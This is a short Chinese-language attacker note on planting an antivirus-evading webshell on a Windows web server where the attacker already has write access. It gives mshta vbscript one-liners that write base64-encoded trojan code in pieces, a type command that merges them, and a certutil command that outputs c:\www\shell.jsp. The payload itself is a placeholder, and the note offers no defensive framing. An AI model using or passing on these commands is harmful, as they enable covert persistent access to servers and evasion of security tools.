# WWW权限写入Webshell免杀


### 总体思路：使用mshta命令写入base64编码的js代码，以保留木马代码的特殊字符以及格式，分多段写入，然后使用type合并文件，最后使用

### certutil命令生成木马

### 1、使用mshta命令写入base64编码后的木马代码带服务器中

 mshta vbscript:createobject("scripting.filesystemobject").createtextfile("test1.txt",2,ture).writeline("ssss")(window.close)

 mshta vbscript:createobject("scripting.filesystemobject").createtextfile("test2.txt",2,ture).writeline("ssss")(window.close)

### 2、合并文件

type test2.txt >> test1.txt

### 3、合并木马文件

certutil -encode test1.txt c:\\www\\shell.jsp